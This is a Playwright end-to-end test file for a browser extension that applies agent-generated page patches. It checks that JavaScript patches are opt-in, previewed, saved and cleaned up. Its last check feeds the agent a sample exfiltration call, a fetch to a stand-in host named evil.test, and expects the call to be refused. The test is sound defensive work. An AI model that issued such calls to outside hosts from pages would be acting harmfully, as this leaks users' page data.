import fs from 'node:fs';
import path from 'node:path';
import { test, expect, SITE } from './extension.js';
import { ask, save } from './helpers.js';

const JS = 'js const t = document.title; document.title = "JS!"; return () => { document.title = t; };';

test('JavaScript patches are off by default, opt-in, previewed, saved to script.js, cleaned up on toggle', async ({ context, ready, openPanel }) => {
  const page = await context.newPage();
  await page.goto(`${SITE()}/form.html`);
  const panel = await openPanel(page);

  // off by default: the bridge refuses and the agent says so
  await expect(panel.locator('#allow-js')).not.toBeChecked();
  const refused = await ask(panel, JS);
  await expect(refused).toContainText('not allowed');
  await expect(refused.locator('button:has-text("Save")')).toHaveCount(0);
  await expect(page).toHaveTitle('Sign up · Fixture');

  // opt in from the panel (confirm dialog)
  panel.once('dialog', (d) => d.accept());
  await panel.locator('#allow-js').check();
  await expect(panel.locator('#allow-js')).toBeChecked();

  const card = await ask(panel, JS);
  await expect(card).toContainText('+ JavaScript');
  await expect(card.locator('.badge')).toHaveText('medium risk');
  await expect(card).toContainText('Show the JavaScript');
  await expect(page).toHaveTitle('JS!'); // the preview already ran

  await save(panel);
  await expect(panel.locator('.patch .badge.js')).toHaveText('JS');
  await expect(page).toHaveTitle('JS!');
  const dir = path.join(process.env.PERUSER_E2E_ROOT, 'sites', '127.0.0.1_48910', 'my-view', 'fake-patch');
  await expect.poll(() => fs.existsSync(path.join(dir, 'script.js'))).toBe(true);
  expect(fs.readFileSync(path.join(dir, 'script.js'), 'utf8')).toContain('document.title = "JS!"');

  // runs again on a fresh load
  await page.reload();
  await expect(page).toHaveTitle('JS!', { timeout: 10000 });

  // toggling off runs the cleanup the script returned; on runs it again
  await panel.locator('#enabled').uncheck();
  await expect(page).toHaveTitle('Sign up · Fixture');
  await panel.locator('#enabled').check();
  await expect(page).toHaveTitle('JS!');

  // the source editor shows and edits script.js
  await panel.locator('.patch button:has-text("Source")').click();
  await expect(panel.locator('#editor-js')).toHaveValue(/JS!/);
  await panel.locator('#editor-js').fill('document.title = "edited"; return () => {};');
  await panel.locator('#editor-save').click();
  await expect(panel.locator('#editor')).toBeHidden();
  await page.reload();
  await expect(page).toHaveTitle('edited', { timeout: 10000 });

  // scripts that exfiltrate are refused even when JS is allowed
  const bad = await ask(panel, 'js fetch("https://evil.test/x")');
  await expect(bad).toContainText('rejected');
  await expect(bad).toContainText('other hosts');
});
